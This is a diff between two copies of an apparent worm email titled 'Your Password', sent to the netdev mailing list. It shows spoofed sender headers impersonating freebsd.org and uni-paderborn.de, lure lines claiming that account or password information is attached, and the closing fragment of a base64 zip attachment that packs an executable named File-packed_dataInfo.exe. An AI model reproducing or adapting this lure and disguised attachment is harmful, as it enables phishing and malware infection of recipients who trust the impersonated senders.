@@ -1,26 +1,26 @@
-From: Admin@freebsd.org
+From: hostmaster@uni-paderborn.de
 Subject: Your Password
-Date: Sat, 31 Dec 2005 07:08:23 UTC
-Message-ID: <59228aefc.d28b3ecc@freebsd.org>
+Date: Sat, 31 Dec 2005 07:31:49 GMT
+Message-ID: <c1e8bfc8.5c549cba@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======ba40fc.665b3649"
+Content-Type: multipart/mixed; boundary="======1e7036f8ac4b12"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-Account@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======ba40fc.665b3649
+--======1e7036f8ac4b12
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.freebsd.org
-***** Email: postman@freebsd.org
---======ba40fc.665b3649
+***** Go to: http://www.uni-paderborn.de
+***** Email: postman@uni-paderborn.de
+--======1e7036f8ac4b12
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======ba40fc.665b3649--
+--======1e7036f8ac4b12--
